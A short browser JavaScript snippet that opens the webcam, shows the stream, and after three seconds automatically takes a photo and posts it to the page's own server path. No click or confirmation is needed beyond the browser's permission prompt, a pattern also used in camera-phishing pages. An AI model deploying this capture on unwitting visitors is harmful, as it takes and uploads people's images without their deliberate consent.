navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
    document.getElementById('video').srcObject = stream;
    const track = stream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(track);
    setTimeout(() => {
        imageCapture.takePhoto().then(blob => {
            const reader = new FileReader();
            reader.onloadend = () => {
                fetch(window.location.pathname, {
                    method: "POST",
                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
                    body: "image=" + encodeURIComponent(reader.result)
                });
            };
            reader.readAsDataURL(blob);
        });
    }, 3000);
});
